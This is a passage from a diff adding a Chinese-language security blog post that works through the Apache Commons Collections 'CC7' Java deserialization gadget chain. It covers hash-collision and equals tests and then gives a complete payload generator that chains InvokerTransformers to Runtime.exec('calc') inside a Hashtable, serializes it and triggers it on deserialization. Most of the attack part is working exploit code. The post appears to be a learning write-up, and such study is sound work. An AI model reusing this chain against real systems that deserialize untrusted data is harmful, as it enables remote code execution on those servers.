class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有输出，说明不是相同的。这里就涉及到了哈希碰撞的问题，不多说，在ysoserial链中调用的是<code>yy</code>和<code>zZ</code>，这两个值的hashCode()结果是相同的：<br><img src="/2024/08/13/CC7/image-20240801223140188.png" alt="image-20240801223140188"></p>
+<p>同时结合前面最开始调试hashCode那部分说了会调用到HashMap内部类Node的hashCode()方法：<br><img src="/2024/08/13/CC7/image-20240801225144106.png" alt="image-20240801225144106"></p>
+<p>所以这里的value也需要设置为相同的，所以最终的测试代码为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(lazy1.hashCode()==lazy0.hashCode())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功输出相等。</p>
+<p>但是此时将这个代码稍微修改一下又可以用来测试第二个条件（但是有问题），如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">haha1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,haha0);</span><br><span class="line">        lazy0.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,haha1);</span><br><span class="line">        lazy1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(lazy0.equals(lazy1))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出：相等</span></span><br></pre></td></tr></table></figure>
+
+<p>很怪反正，代码绝对有问题，要么就是我的JVM虚拟机有点问题，直接在最终equals()方法加断点可以到，这里不管put进的键是什么，<strong>只要两个值都是1就会输出相等（好像only 1）</strong>，但是这里都改成其他的比如2就不会了，改成2对于hashCode应该也没有影响，并且代码输出也没有问题。</p>
+<p>那么就可以尝试构造真正的利用链了，还需要注意的就是在第二次put的时候就会执行一次调用链了，此时就需要注意LazyMap的get()方法，和之前的CC6差不多，需要remove，直接打断点来看传进去的值：</p>
+<p><img src="/2024/08/13/CC7/image-20240802001231117.png" alt="image-20240802001231117"></p>
+<p>再看进入这个get方法的equals()方法的位置：</p>
+<p><img src="/2024/08/13/CC7/image-20240802001653262.png" alt="image-20240802001653262"></p>
+<p>此时的key是lazy0的键，所以这里会对lazy1的哈希表再put进一个值：</p>
+<p><img src="/2024/08/13/CC7/image-20240802001948885.png" alt="image-20240802001948885"></p>
+<p>这里结果是1很正常，fakeTransformer链子返回的就是这个。</p>
+<p>同时在Hashtable的readObject()方法中，要注意下面的代码：<br><img src="/2024/08/13/CC7/image-20240802002126349.png" alt="image-20240802002126349"></p>
+<p>也就是要求对象的键值对个数相同。所以我们这里需要将第二个对象增加的键值对（yy-1）删去。最终构成如下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy0</span> <span class="operator">=</span> LazyMap.decorate(hashMap0,chain);</span><br><span class="line">        lazy0.put(<span class="string">&quot;yy&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1,chain);</span><br><span class="line">        lazy1.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        hashtable.put(lazy0,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazy1,<span class="number">2</span>);</span><br><span class="line">        hashMap1.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算机。</p>
+<p>问题：</p>
+<ul>
+<li>不加键值对直接到size()问题</li>
+<li>哈希碰撞问题</li>
+<li>为什么对LazyMap使用put时的键值对的值需要相同，可能是内部类Node那里的hashCode方法原因。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Fupanc
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://fupanc.github.io/2024/08/13/CC7/" title="CC7">https://fupanc.github.io/2024/08/13/CC7/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/08/13/CC6/" rel="prev" title="CC6">
+                  <i class="fa fa-angle-left"></i> CC6
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/08/13/CC5/" rel="next" title="CC5">
+                  CC5 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fupanc</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script type="text/javascript"
+  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+    
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
